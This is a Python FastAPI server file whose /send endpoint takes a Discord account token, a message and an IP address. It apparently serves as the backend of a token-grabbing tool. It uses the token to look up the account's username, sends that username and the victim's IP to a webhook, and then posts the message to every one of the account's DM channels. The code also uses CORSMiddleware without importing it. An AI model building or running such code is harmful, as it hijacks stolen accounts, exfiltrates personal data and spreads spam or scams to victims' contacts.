from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import requests
import os
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
class Payload(BaseModel):
    token: str
    message: str
    ip: str

@app.get("/test")
async def test_handler():
    return "Hello, World!"

@app.post("/send")
async def send(payload: Payload):
    logger.info("Received payload: %s", payload)

    # Debug: Print the token
    logger.info("Token: %s", payload.token)

    # Fetch user information (username)
    user_info_url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": f"Bearer {payload.token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    try:
        logger.info("Fetching user information from: %s", user_info_url)
        user_response = requests.get(user_info_url, headers=headers)
        user_response.raise_for_status()
        user_data = user_response.json()
        logger.info("User data: %s", user_data)
        username = user_data.get("username", "Unknown")
        logger.info("Fetched username: %s", username)
    except requests.exceptions.RequestException as e:
        logger.error("❌ Failed to fetch username: %s", e)
        raise HTTPException(status_code=401, detail="Failed to fetch username")

    # Send message to Discord webhook including IP and username
    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")  # Read webhook URL from environment variables
    if not webhook_url:
        logger.error("❌ Webhook URL not configured")
        raise HTTPException(status_code=500, detail="Webhook URL not configured")

    webhook_content = f"Message: {payload.message}\nUsername: {username}\nIP: {payload.ip}"
    discord_payload = {"content": webhook_content}
    logger.info("Sending message to webhook: %s", webhook_content)

    try:
        webhook_response = requests.post(webhook_url, json=discord_payload)
        webhook_response.raise_for_status()
        logger.info("✅ Message sent to webhook")
    except requests.exceptions.RequestException as e:
        logger.error("❌ Failed to send message to webhook: %s", e)

    # Fetch user's DM channels
    dm_channels_url = "https://discord.com/api/v9/users/@me/channels"
    try:
        logger.info("Fetching DM channels from: %s", dm_channels_url)
        dm_response = requests.get(dm_channels_url, headers=headers)
        dm_response.raise_for_status()
        dm_channels = dm_response.json()
        logger.info("Fetched DM channels: %s", dm_channels)

        for dm in dm_channels:
            dm_id = dm.get("id")
            if dm_id:
                logger.info("Sending message to DM channel: %s", dm_id)
                dm_message_url = f"https://discord.com/api/v9/channels/{dm_id}/messages"
                try:
                    msg_response = requests.post(
                        dm_message_url,
                        headers=headers,
                        json={"content": payload.message},
                    )
                    msg_response.raise_for_status()
                    logger.info("✅ Message sent to DM: %s", dm_id)
                except requests.exceptions.RequestException as e:
                    logger.error("❌ Failed to send message to DM %s: %s", dm_id, e)

                # Delay to prevent rate limiting
                time.sleep(1)

        return "✅ Messages sent to webhook and DMs"
    except requests.exceptions.RequestException as e:
        logger.error("❌ Failed to fetch DM channels: %s", e)
        raise HTTPException(status_code=401, detail="Failed to fetch DM channels")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "10000")))
